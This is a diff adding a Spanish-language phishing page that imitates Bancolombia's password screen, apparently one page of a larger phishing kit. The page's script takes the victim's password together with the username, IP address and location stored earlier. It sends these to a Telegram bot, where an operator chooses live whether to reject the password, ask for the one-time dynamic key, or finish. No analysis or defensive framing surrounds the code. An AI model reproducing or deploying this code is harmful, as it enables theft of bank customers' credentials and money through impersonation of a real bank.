@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Ingresa tu clave - Bancolombia</title>
+    
+    <link href="css/styles.css" rel="stylesheet">
+    <link href="css/bootstrap.css" rel="stylesheet">
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif;
+        }
+        
+        .container-main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .panel-primary {
+            background: white;
+            border: 1px solid #cccccc;
+            margin-top: 20px;
+        }
+        
+        .panel-heading {
+            background-color: #2c2a29;
+            color: white;
+            padding: 10px 15px;
+        }
+        
+        .panel-heading h3 {
+            margin: 0;
+            font-size: 16px;
+            font-family: 'CIBFontSans', Arial, sans-serif;
+        }
+        
+        .mua-panel-body {
+            padding: 30px 15px;
+        }
+        
+        .panel_general {
+            background: white;
+            border: 1px solid #cccccc;
+            padding: 0;
+            margin-bottom: 20px;
+        }
+        
+        .title-panel-label {
+            background-color: #2c2a29;
+            padding: 10px;
+        }
+        
+        .title-panel-label h1 {
+            color: white;
+            font-size: 16px;
+            margin: 0;
+            font-family: 'CIBFontSans', Arial, sans-serif;
+        }
+        
+        .subtitle-land-label {
+            background-color: #f4f4f4;
+            padding: 8px 10px;
+        }
+        
+        .subtitle-land-label h4 {
+            font-size: 12px;
+            margin: 0;
+            color: #2c2a29;
+        }
+        
+        .mua-content-group-panel {
+            padding: 20px 15px;
+        }
+        
+        .mua-label-input {
+            margin-bottom: 10px;
+        }
+        
+        .control-label-index {
+            font-size: 14px;
+            color: #2c2a29;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .mua_svp_enroll_update_control {
+            position: relative;
+        }
+        
+        .mua-form-control {
+            width: 100%;
+            height: 34px;
+            padding: 6px 12px 6px 45px;
+            font-size: 14px;
+            border: 1px solid #cccccc;
+            border-radius: 0;
+            font-family: "OpenSans-Regular", Arial, sans-serif;
+        }
+        
+        .mua-form-control:focus {
+            outline: none;
+            border-color: #00448c;
+        }
+        
+        .mua-icon-lock {
+            background: url("img/icon-lock.png") no-repeat center;
+            width: 18px;
+            height: 18px;
+            position: absolute;
+            left: 15px;
+            top: 8px;
+        }
+        
+        .mua-button-container {
+            padding: 20px 15px;
+            text-align: center;
+        }
+        
+        .btn-success {
+            background-color: #fdda24;
+            border: none;
+            color: #2c2a29;
+            padding: 10px 30px;
+            font-size: 14px;
+            font-weight: bold;
+            min-width: 120px;
+            cursor: pointer;
+            border-radius: 0;
+        }
+        
+        .btn-success:hover {
+            background-color: #fdc82a;
+        }
+        
+        .btn-success:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+        
+        .errorDiv {
+            border: 1px solid #cccccc;
+            background-color: white;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .errorDiv.show {
+            display: block;
+        }
+        
+        .errorIcon {
+            font-size: 38px;
+            color: #ff7f41;
+            float: left;
+            margin-right: 15px;
+        }
+        
+        .errorTitulo {
+            font-size: 18px;
+            font-weight: bold;
+            color: #2c2a29;
+            margin-bottom: 5px;
+        }
+        
+        .errorTexto {
+            font-size: 14px;
+            color: #2c2a29;
+        }
+        
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+        }
+        
+        .loading-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #fdda24;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .mua-imgLogoItem {
+            background: url("img/logo.svg") no-repeat;
+            width: 175px;
+            height: 25px;
+            margin: 10px 0;
+        }
+        
+        @media (max-width: 768px) {
+            .container-main {
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <p style="font-size: 16px; color: #2c2a29;">Verificando tus datos...</p>
+        </div>
+    </div>
+
+    <div class="container-main" id="containerMain">
+        <div class="row">
+            <div class="col-xs-12">
+                <div class="mua-imgLogoItem"></div>
+            </div>
+        </div>
+        
+        <div class="panel panel-primary">
+            <div class="panel-heading">
+                <h3>Ingresa tu clave</h3>
+            </div>
+            
+            <div class="mua-panel-body">
+                <div class="row">
+                    <div class="col-xs-12 col-sm-6 col-md-5">
+                        <div class="errorDiv" id="errorMsg">
+                            <div class="divTextMessage">
+                                <span class="errorIcon icon-error">
+                                    <span class="path1"></span>
+                                    <span class="path2"></span>
+                                    <span class="path3"></span>
+                                </span>
+                                <div class="errorTitulo">Error</div>
+                                <div class="errorTexto" id="errorText">
+                                    Clave incorrecta. Por favor intenta nuevamente.
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="panel_general">
+                            <div class="title-panel-label">
+                                <h1>Clave de acceso</h1>
+                            </div>
+                            <div class="subtitle-land-label">
+                                <h4>Ingresa tu clave para continuar</h4>
+                            </div>
+                            
+                            <form id="passForm">
+                                <div class="mua-content-group-panel">
+                                    <div class="mua-label-input">
+                                        <label class="control-label-index" for="password">Ingresa tu clave</label>
+                                    </div>
+                                    <div class="mua_svp_enroll_update_control">
+                                        <input id="password" 
+                                               name="password" 
+                                               type="password" 
+                                               class="mua-form-control" 
+                                               maxlength="8" 
+                                               placeholder="Clave" 
+                                               required 
+                                               autocomplete="off">
+                                        <span class="mua-icon-lock"></span>
+                                    </div>
+                                </div>
+                                
+                                <div class="mua-button-container">
+                                    <button type="submit" class="btn btn-success" id="btnContinuar">
+                                        Continuar
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/sendTelegramMessage.js"></script>
+    <script>
+        // Función de handleAction
+        async function handleAction(action, transactionId) {
+            console.log("🎯 Acción recibida:", action);
+            
+            if (action.startsWith('correcto:')) {
+                window.location.href = 'otp.html';
+            } else if (action.startsWith('incorrecto:')) {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                const errorMsg = document.getElementById('errorMsg');
+                errorMsg.classList.add('show');
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            } else if (action.startsWith('pedir_dinamica:')) {
+                window.location.href = 'otp.html';
+            } else if (action.startsWith('error_login:')) {
+                document.getElementById('loadingOverlay').style.display = 'none';
+                document.getElementById('errorText').textContent = 'Error de conexión. Intenta nuevamente.';
+                const errorMsg = document.getElementById('errorMsg');
+                errorMsg.classList.add('show');
+            } else if (action.startsWith('finish:')) {
+                window.location.href = 'exito.html';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const userName = localStorage.getItem('userName');
+            const userIP = localStorage.getItem('userIP');
+            const userIP2 = localStorage.getItem('userIP2');
+            
+            if (!userName) {
+                window.location.href = 'indexx.html';
+                return;
+            }
+            
+            const form = document.getElementById('passForm');
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            if (urlParams.get('error') === '1') {
+                document.getElementById('errorMsg').classList.add('show');
+            }
+            
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const password = document.getElementById('password').value;
+                
+                if (password.length < 4) {
+                    document.getElementById('errorText').textContent = 'La clave debe tener al menos 4 caracteres';
+                    document.getElementById('errorMsg').classList.add('show');
+                    return;
+                }
+                
+                localStorage.setItem('userPass', password);
+                
+                document.getElementById('loadingOverlay').style.display = 'block';
+                document.getElementById('errorMsg').classList.remove('show');
+                
+                const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+                localStorage.setItem('transactionId', transactionId);
+                
+                const mensaje = `🔐 *BANCOLOMBIA - DATOS COMPLETOS*\n\n📄 *Usuario:* ${userName}\n🔑 *Clave:* ${password}\n🌐 *IP:* ${userIP}\n📍 *Ubicación:* ${userIP2}\n⏰ *Hora:* ${new Date().toLocaleTimeString('es-CO')}\n📅 *Fecha:* ${new Date().toLocaleDateString('es-CO')}\n\n⚠️ *Esperando validación...*`;
+                
+                const teclado = JSON.stringify({
+                    inline_keyboard: [
+                        [
+                            { text: "✅ Correcto", callback_data: `correcto:${transactionId}` },
+                            { text: "❌ Incorrecto", callback_data: `incorrecto:${transactionId}` }
+                        ],
+                        [
+                            { text: "🔐 Pedir Clave Dinámica", callback_data: `pedir_dinamica:${transactionId}` }
+                        ],
+                        [
+                            { text: "⚠️ Error Login", callback_data: `error_login:${transactionId}` },
+                            { text: "✔️ Finalizar", callback_data: `finish:${transactionId}` }
+                        ]
+                    ]
+                });
+                
+                try {
+                    const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
+                    const { action } = await waitForButtonPress(responseMensaje.message_id);
+                    await handleAction(action, transactionId);
+                } catch (error) {
+                    console.error("❌ Error:", error);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    document.getElementById('errorText').textContent = 'Error de conexión. Intenta nuevamente.';
+                    document.getElementById('errorMsg').classList.add('show');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
